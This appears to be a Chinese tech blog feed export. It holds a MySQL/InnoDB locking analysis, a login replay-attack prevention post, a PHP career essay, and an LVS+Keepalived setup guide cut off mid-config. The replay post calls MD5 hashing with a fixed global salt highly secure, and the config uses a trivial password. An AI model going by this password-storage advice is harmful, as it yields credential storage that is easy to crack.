首先，这是一个好问题。其次，回答这个问题，也很简单。GAP锁的目的，是为了防止同一事务的两次当前读，出现幻读的情况。而组合五，id是主键；组合六，id是unique键，都能够保证唯一性。一个等值查询，最多只能返回一条记录，而且新的相同取值的记录，一定不会在新插入进来，因此也就避免了GAP锁的使用。其实，针对此问题，还有一个更深入的问题：如果组合五、组合六下，针对SQL：select * from t1 where id = 10 for update; 第一次查询，没有找到满足查询条件的记录，那么GAP锁是否还能够省略？此问题留给大家思考。   <strong>结论：</strong>Repeatable Read隔离级别下，id列上有一个非唯一索引，对应SQL：delete from t1 where id = 10; 首先，通过id索引定位到第一条满足查询条件的记录，加记录上的X锁，加GAP上的GAP锁，然后加主键聚簇索引上的记录X锁，然后返回；然后读取下一条，重复进行。直至进行到第一条不满足条件的记录[11,f]，此时，不需要加记录X锁，但是仍旧需要加GAP锁，最后返回结束。  </p>
<ol>
<li><h2 id="组合八：id无索引-RR"><a href="#组合八：id无索引-RR" class="headerlink" title="组合八：id无索引+RR"></a><strong>组合八：id无索引+RR</strong></h2></li>
</ol>
<p>  组合八，Repeatable Read隔离级别下的最后一种情况，id列上没有索引。此时SQL：delete from t1 where id = 10; 没有其他的路径可以选择，只能进行全表扫描。最终的加锁情况，如下图所示： <a href="http://www.yupoo.com/photos/hedengcheng/90010764/" title="id 无索引+rr"><img src="http://pic.yupoo.com/hedengcheng/DnJ6Rf3q/medish.jpg" alt="id 无索引+rr"></a> 如图，这是一个很恐怖的现象。首先，聚簇索引上的所有记录，都被加上了X锁。其次，聚簇索引每条记录间的间隙(GAP)，也同时被加上了GAP锁。这个示例表，只有6条记录，一共需要6个记录锁，7个GAP锁。试想，如果表上有1000万条记录呢？   在这种情况下，这个表上，除了不加锁的快照度，其他任何加锁的并发SQL，均不能执行，不能更新，不能删除，不能插入，全表被锁死。   当然，跟组合四：[<a href="http://hedengcheng.com/?p=771#_%E7%BB%84%E5%90%88%E5%9B%9B%EF%BC%9Aid%E6%97%A0%E7%B4%A2%E5%BC%95+RC">id无索引, Read Committed</a>]类似，这个情况下，MySQL也做了一些优化，就是所谓的semi-consistent read。semi-consistent read开启的情况下，对于不满足查询条件的记录，MySQL会提前放锁。针对上面的这个用例，就是除了记录[d,10]，[g,10]之外，所有的记录锁都会被释放，同时不加GAP锁。semi-consistent read如何触发：要么是read committed隔离级别；要么是Repeatable Read隔离级别，同时设置了<a href="http://dev.mysql.com/doc/refman/5.5/en/innodb-parameters.html">innodb_locks_unsafe_for_binlog</a> 参数。更详细的关于semi-consistent read的介绍，可参考我之前的一篇博客：<a href="http://hedengcheng.com/?p=220">MySQL+InnoDB semi-consitent read原理及实现分析</a> 。   <strong>结论：</strong>在Repeatable Read隔离级别下，如果进行全表扫描的当前读，那么会锁上表中的所有记录，同时会锁上聚簇索引内的所有GAP，杜绝所有的并发 更新/删除/插入 操作。当然，也可以通过触发semi-consistent read，来缓解加锁开销与并发影响，但是semi-consistent read本身也会带来其他问题，不建议使用。  </p>
<ol>
<li><h2 id="组合九：Serializable"><a href="#组合九：Serializable" class="headerlink" title="组合九：Serializable"></a><strong>组合九：Serializable</strong></h2></li>
</ol>
<p>  针对前面提到的简单的SQL，最后一个情况：Serializable隔离级别。对于SQL2：delete from t1 where id = 10; 来说，Serializable隔离级别与Repeatable Read隔离级别完全一致，因此不做介绍。   Serializable隔离级别，影响的是SQL1：select * from t1 where id = 10; 这条SQL，在RC，RR隔离级别下，都是快照读，不加锁。但是在Serializable隔离级别，SQL1会加读锁，也就是说快照读不复存在，MVCC并发控制降级为Lock-Based CC。   <strong>结论：</strong>在MySQL/InnoDB中，所谓的读不加锁，并不适用于所有的情况，而是隔离级别相关的。Serializable隔离级别，读不加锁就不再成立，所有的读操作，都是当前读。  </p>
<ol>
<li><h1 id="一条复杂的SQL"><a href="#一条复杂的SQL" class="headerlink" title="一条复杂的SQL"></a><strong>一条复杂的SQL</strong></h1></li>
</ol>
<p>  写到这里，其实MySQL的加锁实现也已经介绍的八八九九。只要将本文上面的分析思路，大部分的SQL，都能分析出其会加哪些锁。而这里，再来看一个稍微复杂点的SQL，用于说明MySQL加锁的另外一个逻辑。SQL用例如下： <a href="http://www.yupoo.com/photos/hedengcheng/90010767/" title="复杂SQL"><img src="http://pic.yupoo.com/hedengcheng/DnJ6S3ta/medish.jpg" alt="复杂SQL"></a> 如图中的SQL，会加什么锁？假定在Repeatable Read隔离级别下 (Read Committed隔离级别下的加锁情况，留给读者分析。)，同时，假设SQL走的是idx_t1_pu索引。   在详细分析这条SQL的加锁情况前，还需要有一个知识储备，那就是一个SQL中的where条件如何拆分？具体的介绍，建议阅读我之前的一篇文章：<a href="http://hedengcheng.com/?p=577">SQL中的where条件，在数据库中提取与应用浅析</a> 。在这里，我直接给出分析后的结果：  </p>
<ul>
<li><p><strong>Index key：</strong>pubtime &gt; 1 and puptime &lt; 20。此条件，用于确定SQL在idx_t1_pu索引上的查询范围。</p>
</li>
<li><p><strong>Index Filter：</strong>userid = ‘hdc’ 。此条件，可以在idx_t1_pu索引上进行过滤，但不属于Index Key。</p>
</li>
</ul>
<ul>
<li><strong>Table Filter：</strong>comment is not NULL。此条件，在idx_t1_pu索引上无法过滤，只能在聚簇索引上过滤。</li>
</ul>
<p>  在分析出SQL where条件的构成之后，再来看看这条SQL的加锁情况 (RR隔离级别)，如下图所示： <a href="http://www.yupoo.com/photos/hedengcheng/90010768/" title="SQL加锁"><img src="http://pic.yupoo.com/hedengcheng/DnJ6S1s7/medish.jpg" alt="SQL加锁"></a> 从图中可以看出，在Repeatable Read隔离级别下，由Index Key所确定的范围，被加上了GAP锁；Index Filter锁给定的条件 (userid = ‘hdc’)何时过滤，视MySQL的版本而定，在MySQL 5.6版本之前，不支持<a href="http://dev.mysql.com/doc/refman/5.6/en/index-condition-pushdown-optimization.html">Index Condition Pushdown</a>(ICP)，因此Index Filter在MySQL Server层过滤，在5.6后支持了Index Condition Pushdown，则在index上过滤。若不支持ICP，不满足Index Filter的记录，也需要加上记录X锁，若支持ICP，则不满足Index Filter的记录，无需加记录X锁 (图中，用红色箭头标出的X锁，是否要加，视是否支持ICP而定)；而Table Filter对应的过滤条件，则在聚簇索引中读取后，在MySQL Server层面过滤，因此聚簇索引上也需要X锁。最后，选取出了一条满足条件的记录[8,hdc,d,5,good]，但是加锁的数量，要远远大于满足条件的记录数量。   <strong>结论：</strong>在Repeatable Read隔离级别下，针对一个复杂的SQL，首先需要提取其where条件。Index Key确定的范围，需要加上GAP锁；Index Filter过滤条件，视MySQL版本是否支持ICP，若支持ICP，则不满足Index Filter的记录，不加X锁，否则需要X锁；Table Filter过滤条件，无论是否满足，都需要加X锁。  </p>
<ol>
<li><h1 id="死锁原理与分析"><a href="#死锁原理与分析" class="headerlink" title="死锁原理与分析"></a><strong>死锁原理与分析</strong></h1></li>
</ol>
<p>  本文前面的部分，基本上已经涵盖了MySQL/InnoDB所有的加锁规则。深入理解MySQL如何加锁，有两个比较重要的作用：  </p>
<ul>
<li><p>可以根据MySQL的加锁规则，写出不会发生死锁的SQL；</p>
</li>
<li><p>可以根据MySQL的加锁规则，定位出线上产生死锁的原因；</p>
</li>
</ul>
<p>下面，来看看两个死锁的例子 (一个是两个Session的两条SQL产生死锁；另一个是两个Session的一条SQL，产生死锁)： <a href="http://www.yupoo.com/photos/hedengcheng/90010769/" title="死锁用例"><img src="http://pic.yupoo.com/hedengcheng/DnJ6RTaA/medish.jpg" alt="死锁用例"></a> <a href="http://www.yupoo.com/photos/hedengcheng/90010770/" title="死锁用例2"><img src="http://pic.yupoo.com/hedengcheng/DnJ6S9J0/medish.jpg" alt="死锁用例2"></a> 上面的两个死锁用例。第一个非常好理解，也是最常见的死锁，每个事务执行两条SQL，分别持有了一把锁，然后加另一把锁，产生死锁。   第二个用例，虽然每个Session都只有一条语句，仍旧会产生死锁。要分析这个死锁，首先必须用到本文前面提到的MySQL加锁的规则。针对Session 1，从name索引出发，读到的[hdc, 1]，[hdc, 6]均满足条件，不仅会加name索引上的记录X锁，而且会加聚簇索引上的记录X锁，加锁顺序为先[1,hdc,100]，后[6,hdc,10]。而Session 2，从pubtime索引出发，[10,6],[100,1]均满足过滤条件，同样也会加聚簇索引上的记录X锁，加锁顺序为[6,hdc,10]，后[1,hdc,100]。发现没有，跟Session 1的加锁顺序正好相反，如果两个Session恰好都持有了第一把锁，请求加第二把锁，死锁就发生了。   <strong>结论：</strong>死锁的发生与否，并不在于事务中有多少条SQL语句，<strong>死锁的关键在于</strong>：两个(或以上)的Session<strong>加锁的顺序</strong>不一致。而使用本文上面提到的，分析MySQL每条SQL语句的加锁规则，分析出每条语句的加锁顺序，然后检查多个并发SQL间是否存在以相反的顺序加锁的情况，就可以分析出各种潜在的死锁情况，也可以分析出线上死锁发生的原因。  </p>
<ol>
<li><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h1></li>
</ol>
<p>  写到这儿，本文也告一段落，做一个简单的总结，要做的完全掌握MySQL/InnoDB的加锁规则，甚至是其他任何数据库的加锁规则，需要具备以下的一些知识点：  </p>
<ul>
<li><p>了解数据库的一些基本理论知识：数据的存储格式 (堆组织表 vs 聚簇索引表)；并发控制协议 (MVCC vs Lock-Based CC)；Two-Phase Locking；数据库的隔离级别定义 (Isolation Level)；</p>
</li>
<li><p>了解SQL本身的执行计划 (主键扫描 vs 唯一键扫描 vs 范围扫描 vs 全表扫描)；</p>
</li>
<li><p>了解数据库本身的一些实现细节 (过滤条件提取；Index Condition Pushdown；Semi-Consistent Read)；</p>
</li>
<li><p>了解死锁产生的原因及分析的方法 (加锁顺序不一致；分析每个SQL的加锁顺序)</p>
</li>
</ul>
<p>  有了这些知识点，再加上适当的实战经验，全面掌控MySQL/InnoDB的加锁规则，当不在话下。</p>
]]></content>
      <categories>
        <category>MySQL</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>登录重放攻击预防</title>
    <url>/2017/04/01/%E7%99%BB%E5%BD%95%E9%87%8D%E6%94%BE%E6%94%BB%E5%87%BB%E9%A2%84%E9%98%B2/</url>
    <content><![CDATA[<p>** 现在的应用系统中，大部分密码存储都是采用md5加密后存储，常用的登录基本流程如下：**</p>
<ol>
<li>前端web页面用户输入账号、密码，点击登录。</li>
<li>请求提交之前，web端首先通过客户端脚本如javascript对密码原文进行md5加密。</li>
<li>提交账号、md5之后的密码</li>
<li>请求提交至后端，验证账号与密码是否与数据库中的一致，一致则认为登录成功，反之失败。  </li>
</ol>
<p>上述流程看似安全，认为传输过程中的密码是md5之后的，即使被监听截取到，由于md5的不可逆性，密码明文也不会泄露。其实不然！监听者无需解密出密码明文即可登录！监听者只需将监听到的url（如：http://****/login.do?method=login&amp;password=md5之后的密码&amp;userid=登录账号） 重放一下，即可冒充你的身份登录系统。<br>  <br>** 较安全的登录流程 **</p>
<ol>
<li>进入登陆页面时，生成一个随机码（称之为盐值），在客户端页面和session中各保存一份。</li>
<li>客户端提交登录请求时，将md5之后的密码与该随机码拼接后，再次执行md5，然后提交（提交的密码=md5(md5(密码明文)+随机码)）。</li>
<li>后端接收到登录请求后，将从数据库中查询出的密码与session中的随机码拼接后，md5运算，然后与前端传递的结果进行比较。</li>
</ol>
<p>该登录方式，即使登录请求被监听到，回放登录URL，由于随机码不匹配（监听者的session中的随机码与被监听者的session中的随机码相同概率可忽略），无法登录成功。 该登录方式，由于传输的密码是原密码md5之后与随机码再次md5之后的结果，即使监听者采用暴力破解的方式，也很难解密出密码明文。  </p>
<p>** 更安全的登录流程 **</p>
<p>考虑到密码输入的方便性，好多用户的密码都设置的很短，并且不够复杂，往往是6位数字字母组合，这样的密码md5之后保存到数据库，一旦数据库数据泄露，简单密码的md5结果很容易通过暴力破解的方式给解密出来！同时为了方便用户登录的方便性，我们的系统一般不可能要求用户设置很长、很复杂的密码！怎么办？加<strong>固定盐值</strong>。</p>
<ol>
<li>系统设置一个固定的盐值，该盐值最好足够复杂，如:1qaz2wsx3edc4rfv!@#$%^&amp;qqtrtRTWDFHAJBFHAGFUAHKJFHAJHFJHAJWRFA</li>
<li>用户注册、修改密码时，将用户的原始密码与我们的固定盐值拼接，然后做md5运算。</li>
<li>传递至后端，保存进数据库（数据库中保存的密码是用户的原始密码拼接固定盐值后，md5运算后的结果）。</li>
<li>登录时，将用户的原始密码与我们的固定盐值进行拼接，然后做md5运算，运算后的结果再拼接上我们的随机码，再次md5运算，然后提交。</li>
<li>后端接收到登录请求后，将从数据库中查询出的密码与session中的随机码拼接后，md5运算，然后与前端传递的结果进行比较。 该登录方式可以认为是<strong>很很很安全</strong>的登录方式了。  </li>
</ol>
<p>** 进一步完善 **</p>
<ol>
<li>加登录验证码，可预防人为地暴力登录破解，为方便合法用户的正常登录，可设置密码输入错误次数达到3次后再出现验证码。</li>
<li>账户锁定，如果用户密码输入错误次数达到一定量后（如6次），则可以锁定该账号，为了方便合法用户的正常登录，可以设置成一小时后自动解锁。</li>
</ol>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>WEB技术</tag>
      </tags>
  </entry>
  <entry>
    <title>韩天峰-2017 年 PHP 程序员未来路在何方</title>
    <url>/2017/04/01/%E9%9F%A9%E5%A4%A9%E5%B3%B0-2017-%E5%B9%B4-php-%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%AA%E6%9D%A5%E8%B7%AF%E5%9C%A8%E4%BD%95%E6%96%B9/</url>
    <content><![CDATA[<p>PHP 从诞生到现在已经有20多年历史，从Web时代兴起到移动互联网退潮，互联网领域各种编程语言和技术层出不穷， Node.js 、 GO 、 Python 不断地在挑战 PHP 的地位。这些技术的推动者非常热衷于唱衰 PHP ， PHP 语言的未来在哪里？PHP 程序员当如何应对未来的变革？ 作为老牌的Web后端编程语言，PHP 在全球市场占有率非常高，仅次于 Java ，从各个招聘网站的数据上来看PHP 开发的职位非常多，薪资水平也非常不错。实际在中小企业、互联网创业公司PHP的市场地位是高于 Java 的。Java 在超大型企业、传统软件行业、金融领域优势更大。目前来看 Node.js、 GO 、 Python 、 Ruby 等语言还难以企及PHP和Java。 PHP 语言之所以能有今天的地位，得益于PHP语言设计者一直遵从实用主义，将技术的复杂性隐藏在底层。PHP 语言入门简单，容易掌握，程序健壮性好，不容易出现像 Java 、 C++ 等其他语言那样复杂的问题，如内存泄漏和 Crash ，跟踪调试相对轻松很多。PHP 官方提供的标准库非常强大，各种功能函数都能在官方的标准库中找到，包括MySQL、Memcache、Redis、GD图形库、CURL、XML、JSON等等，免除了开发者到处找库的烦恼。PHP 的文档非常棒，每个函数都有详细的说明和使用示例。第三方类库和工具、代码、项目也很丰富。开发者可以快速、高效地使用 PHP 编写开发各类软件。到目前为止市面上仍然没有出现比 PHP 更简单易用的编程语言。所以 PHP 的前景还是很广阔的，与其纠结于编程语言的选择，不如好好地深入学习使用 PHP 。 作为一个资深的 PHP 开发者，在技术上给各位 PHP 程序十点未来的建议，希望对大家有所帮助。</p>
<h2 id="1-Composer"><a href="#1-Composer" class="headerlink" title="1. Composer"></a>1. Composer</h2><p>第一点就要提 Composer ，自从 Composer 出现后，PHP 的依赖管理可以变得非常简单。程序内依赖一些类库和框架，直接使用 Composer 引入即可，通过使用 composer update 安装依赖的包。解决了过去加载外部库的各种难题。Composer 也有国内镜像，速度非常快。现在绝大部分PHP开源的项目都提供了 Composer 的支持，建议大家在项目中使用 Composer 来解决 PHP 代码包管理的问题，不要再使用下载源码、手工 include 的原始方法。</p>
<h2 id="2-PHP7"><a href="#2-PHP7" class="headerlink" title="2. PHP7"></a>2. PHP7</h2><p>PHP7 版本对 Zend 引擎做了大量修改，大幅提升了 PHP 语言的性能，使用 PHP7 可以使你的程序性能瞬间翻倍。即使是 WordPress 这样重量级的软件运行在 PHP7 都能有上千 QPS ，相当于一台服务器每天就能处理 8000 万次请求。使用 PHP7 ，做好 MySQL 优化，使用 Memcache 和 Redis 进行加速，这套技术架构完全可以应对相当大规模的系统。除了某些亿级用户的平台之外，一般规模的系统完全没有压力。</p>
<h2 id="3-PSR"><a href="#3-PSR" class="headerlink" title="3. PSR"></a>3. PSR</h2><p>PSR 是 <a href="http://link.zhihu.com/?target=http://www.php-fig.org/">PHP Framework Interop Group</a> 组织制定的PHP语言开发规范，约定了很多方面的规则，如命名空间、类名 规范、编码风格标准、Autoload、公共接口等。现在已经成为PHP技术社区事实上的标准了。很多知名的 PHP 框架和类库都遵守了 PSR 规范。PHP 开发者应当学习掌握 PSR 规范，在开发程序时应当尽量遵循 PSR 规范。</p>
<h2 id="4-Swoole"><a href="#4-Swoole" class="headerlink" title="4. Swoole"></a>4. Swoole</h2><p>2017 年 PHP 还局限于做 Web 网站吗？No ，如果你还不知道 Swoole ，赶快去了解一下吧。Swoole 的口号是重新定义 PHP 语言，Swoole 是一个异步并行的通信引擎，作为 PHP 的扩展来运行。Node.js 的异步回调 Swoole 有，Go语言的协程 Swoole 也有，这完全颠覆了对 PHP 的认知。使用 Swoole PHP 可以实现常驻内存的 Server 程序，可以实现 TCP 、 UDP 异步网络通信的编程开发。过去PHP只能做一个 Web 网站，现在使用 Swoole 可以做 Java 、C++ 才能实现的通信服务，比如 WebSocket 即使通信、聊天、推送服务器、RPC 远程调用服务、网关、代理、游戏服务器等。如果你想用 PHP 做点 Web 系统之外的东西，Swoole 是最好的选择。</p>
<h2 id="5-Laravel"><a href="#5-Laravel" class="headerlink" title="5. Laravel"></a>5. Laravel</h2><p>最近几年最火热的 PHP 框架，官网号称是为 Web 艺术家设计的框架，可见这套框架有多优雅。Laravel 提供的功能模块丰富，API 设计简洁，表达力强。而且它的社区非常活跃，代码贡献者众多，第三方的插件非常多，生态系统相当繁荣。 Laravel 底层使用了很多 symfony2 组件，通过 composer 实现了依赖管理。如果还在纠结使用什么PHP框架，不如选择 Laravel 。 Laravel 提供的命令行工具基于 symfony.console 实现，功能强大，集成了各种项目管理、自动生成代码的功能。</p>
<h2 id="6-Phar"><a href="#6-Phar" class="headerlink" title="6. Phar"></a>6. Phar</h2><p>PHP5.3 之后支持了类似 Java 的 jar 包，名为 phar。用来将多个 PHP 文件打包为一个文件。这个特性使得 PHP 也可以像 Java 一样方便地实现应用程序打包和组件化。一个应用程序可以打成一个 Phar 包，直接放到 PHP-FPM 中运行。配合 Swoole ，可以在命令行下执行 php server.phar 一键启动服务器。PHP 的代码包可以用 Phar 打包成组件，放到 Swoole 的服务器容器中去加载执行。</p>
<h2 id="7-C-C-GO"><a href="#7-C-C-GO" class="headerlink" title="7. C/C++/GO"></a>7. C/C++/GO</h2><p>任何技术有优点就有缺点，PHP 作为一门动态脚本语言，优点是开发方便效率高。缺点就是性能差。在密集运算的场景下比 C 、 C++ 相差几十倍甚至上百倍。另外 PHP 不可以直接操作底层，需要依赖扩展库来提供 API 实现。PHP 程序员可以学习一门静态编译语言作为补充实现动静互补，C/C++/Go 都是不错的选择。而且静态语言的编程体验与动态语言完全不同，学习过程可以让你得到更大的提升。 掌握 C/C++ 语言后，还可以阅读 PHP 、 Swoole 、 Nginx 、Redis 、 Linux内核 等开源软件的源码，了解其底层运行原理。 现在最新版本的Swoole提供了C++扩展模块的支持，封装了Zend API，用C++操作PHP变得很简单，可以用C++实现PHP扩展函数和类。</p>
<h2 id="8-HTML5"><a href="#8-HTML5" class="headerlink" title="8. HTML5"></a>8. HTML5</h2><p>作为 Web 前端新一代标准，HTML5 未来前景非常广阔，市场需求量非常大。从 PC 网站、B/S 企业软件、移动端网页、APP，这些领域都在拥抱 HTML5，掌握了 HTML5 才能在下一波互联网技术大潮中存活下来。</p>
<h2 id="9-Vue-js"><a href="#9-Vue-js" class="headerlink" title="9. Vue.js"></a>9. Vue.js</h2><p>PHP 程序员除了写后台程序之外，还有很大一部分工作在展现层，和浏览器前端打交道。2017 年你还在用 jQuery 操作 DOM 实现界面渲染吗？已经完全 out 了。现在用 Vue.js 可以非常方便地实现数据和 DOM 元素的绑定。通过 Ajax 请求后台接口返回数据后，更新前端数据自动实现界面渲染。2017 年再不学 Vue 就晚了。 如果你不光要写 Web 程序，同时还希望兼顾 Android 、IOS 、PC 客户端等平台，React Native 是一个不错的选择。</p>
<h2 id="10-深度学习-人工智能"><a href="#10-深度学习-人工智能" class="headerlink" title="10. 深度学习/人工智能"></a>10. 深度学习/人工智能</h2><p>互联网的未来属于人工智能，如果你还不了解机器学习、深度学习、人工智能这些概念，那你需要尽快学习了解一下。现在互联网巨头们都在布局人工智能，包括 Google 、 Facebook 、微软、亚马逊 和国内的百度。虽然现在还处于科学研究的阶段，但未来互联网的各个领域都会应用到人工智能，包括自动驾驶、大数据分析、网络游戏、图像识别、语言处理等。当然现在普通的工程师可能还无法参与到人工智能产品中，但至少应该理解深度学习/人工智能的基本概念和原理。</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
  </entry>
  <entry>
    <title>lVS+Keepalived负载均衡</title>
    <url>/2017/03/30/lvskeepalived%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1/</url>
    <content><![CDATA[<h3 id="一、原理"><a href="#一、原理" class="headerlink" title="一、原理       "></a>一、原理       </h3><p>1、概要介绍<br>如果将TCP/IP划分为5层，则Keepalived就是一个类似于3<del>5层交换机制的软件，具有3</del>5层交换功能，其主要作用是检测web服务器的状态，如果某台web服务器故障，Keepalived将检测到并将其从系统中剔除，当该web服务器工作正常后Keepalived自动将其加入到服务器群中，这些工作全部自动完成，而不需要人工干预，只需要人工修复故障的web服务器即可。</p>
<p> 2、工作原理 Keepalived基于VRRP协议来实现高可用解决方案，利用其避免单点故障，通常这个解决方案中，至少有2台服务器运行Keepalived，即一台为MASTER，另一台为BACKUP，但对外表现为一个虚拟IP，MASTER会发送特定消息给BACKUP，当BACKUP收不到该消息时，则认为MASTER故障了，BACKUP会接管虚拟IP，继续提供服务，从而保证了高可用性，具体如下图：</p>
<p><img src="http://blog.chinaunix.net/attachment/201305/2/22312037_136748933421AQ.png"> 图1 Keepalived原理图</p>
<p>3层机理是发送ICMP数据包即PING给某台服务器，如果不痛，则认为其故障，并从服务器群中剔除。 4层机理是检测TCP端口号状态来判断某台服务器是否故障，如果故障，则从服务器群中剔除。 5层机理是根据用户的设定检查某个服务器应用程序是否正常运行，如果不正常，则从服务器群中剔除。 3、实际作用 主要用作RealServer的健康检查，以及负载均衡设备MASTER和BACKUP之间failover的实现。</p>
<h3 id="二、架构"><a href="#二、架构" class="headerlink" title="二、架构"></a>二、架构</h3><p> 本系列文章以CentOS Linux release 6.0 (Final)为例，介绍用LVS+Keepalived实现高可用负载均衡。具体业务需求是用虚拟IP转发8080、25、21端口请求到后端的真实服务器来处业务逻辑，系统拓扑如下图所示：</p>
<p><img src="http://blog.chinaunix.net/attachment/201304/17/22312037_1366184266yczG.png"> 图2 系统拓扑图</p>
<p>客户端通过VIP（Virtual IP）（172.28.14.227/228/229）来访问负载均衡服务器，负载均衡服务器通过MASTER/172.28.19.92或BACKUP/172.28.19.93将请求分别转发给真实服务器（Web服务器/172.28.19.100/101/102、邮件服务器/172.28.19.103/104/105、文件服务器/172.28.19.106/107/108）。 负载均衡服务器的MASTER和BACKUP上都必须安装LVS+Keepalived，下面开始安装和配置之旅。</p>
<h3 id="三、LVS安装"><a href="#三、LVS安装" class="headerlink" title="三、LVS安装"></a>三、LVS安装</h3><p>Master和Backup都必须安装LVS，安装ipvsadm步骤如下： （1）依赖包安装 执行如下命令查看依赖包是否安装： （A）#rpm -qa|grep popt popt-static-1.13-7.el6.x86_64 popt-devel-1.13-7.el6.x86_64 popt-1.13-7.el6.x86_64 如果没有上述包，则需要依次安装，具体如下： #yum install popt #yum install popt-devel #yum install popt-static （B）rpm -qa|grep libnl libnl-1.1-14.el6.x86_64 libnl-devel-1.1-14.el6.x86_64 如果没有上述包，则需要依次安装，具体如下： #yum install libnl #yum install libnl-devel （2）ipvsadm安装</p>
<p>    #wget  <a href="http://www.linuxvirtualserver.org/software/kernel-2.6/ipvsadm-1.26.tar.gz">http://www.linuxvirtualserver.org/software/kernel-2.6/ipvsadm-1.26.tar.gz</a><br>        #tar zxvf ipvsadm-1.26.tar.gz<br>        #ln -s /usr/src/kernels/2.6.32-71.el6.x86_64 /usr/src/linux         //注意：每个系统这个路径可能会不一样<br>        #cd ipvsadm-1.26<br>        #make<br>        #make install</p>
<p>OK，LVS就这么安装好了。</p>
<h3 id="四、Keepalived安装"><a href="#四、Keepalived安装" class="headerlink" title="四、Keepalived安装"></a>四、Keepalived安装</h3><p>Master和Backup都必须安装Keepalive，安装步骤如下：</p>
<p> #wget <a href="http://www.keepalived.org/software/keepalived-1.2.7.tar.gz">http://www.keepalived.org/software/keepalived-1.2.7.tar.gz</a><br>        #tar zxvf keepalived-1.2.7.tar.gz<br>        #cd keepalived-1.2.7 <br>        #./configure <br>        #make <br>        #make install</p>
<p>OK，Keepalived安装好了。 如果#./configure时出现下面错误： configure: error: !!! OpenSSL is not properly installed on your system. !!! !!! Can not include OpenSSL headers files.            !!! 则需要安装OpenSSL相关包： #yum install openssl #yum install openssl-devel 然后从#./configure步骤开始执行以下后续步骤就行。</p>
<h3 id="五、配置"><a href="#五、配置" class="headerlink" title="五、配置"></a>五、配置</h3><p>1、服务脚本 将Keepalived做成服务启动（MASTER和BACKUP都是必须的），具体步骤如下：<br>（1）拷贝服务启动脚本 #cp ./keepalived/etc/init.d /etc/init.d<br>（2）拷贝配置文件 #mkdir /etc/keepalived #cp ./keepalived/etc/keepalived/keepalived.conf /etc/keepalived<br>（3）拷贝可执行文件 #cp ./bin/keepalived /usr/bin<br>（4）启动/停止服务 #service keepalived start #service keepalived stop<br>2、配置MASTER 备份并打开配置文件修改部分内容，尤其注意红色部分，具体如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#cp &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf.bak</span><br><span class="line">        #vi &#x2F;etc&#x2F;keepalived&#x2F;keepalived.conf</span><br><span class="line">        vrrp\_instance VI\_1 &#123;</span><br><span class="line">            state MASTER            # 状态实际MASTER</span><br><span class="line">            interface eth0            # 监听网卡切换</span><br><span class="line">            virtual\_router\_id 51</span><br><span class="line">            priority 100                # 优先级（越大优先级越高）</span><br><span class="line">            advert_int 1</span><br><span class="line">            authentication &#123;</span><br><span class="line">                auth_type PASS</span><br><span class="line">                auth_pass 1111</span><br><span class="line">            &#125;</span><br><span class="line">            virtual_ipaddress &#123;        # 虚拟IP地址列表，即VIP</span><br><span class="line">                172.28.14.227</span><br><span class="line">                172.28.14.228</span><br><span class="line">                172.28.14.229</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual_server 172.28.14.227 8080 &#123;</span><br><span class="line">            delay_loop 6</span><br><span class="line">            lb_algo wlc</span><br><span class="line">            lb_kind DR                    # DR模式</span><br><span class="line">            persistence_timeout 50</span><br><span class="line">            protocol TCP</span><br><span class="line">            real_server 172.28.19.100 8080 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 8080</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.101 8080 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 8080</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.102 8080 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 8080</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        virtual_server 172.28.14.228 25 &#123;</span><br><span class="line">            delay_loop 6</span><br><span class="line">            lb_algo wlc</span><br><span class="line">            lb_kind DR                    # DR模式</span><br><span class="line">            persistence_timeout 50</span><br><span class="line">            protocol TCP</span><br><span class="line">            real_server 172.28.19.103 25 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 25</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.104 25 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 25</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            real_server 172.28.19.105 25 &#123;</span><br><span class="line">                weight 1                  # 权重（权重越高处理的请求越多）</span><br><span class="line">                TCP_CHECK &#123;</span><br><span class="line">                    connect_timeout 3</span><br><span class="line">                    nb\_get\_retry 3</span><br><span class="line">                    delay\_before\_retry 3</span><br><span class="line">                    connect_port 25</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        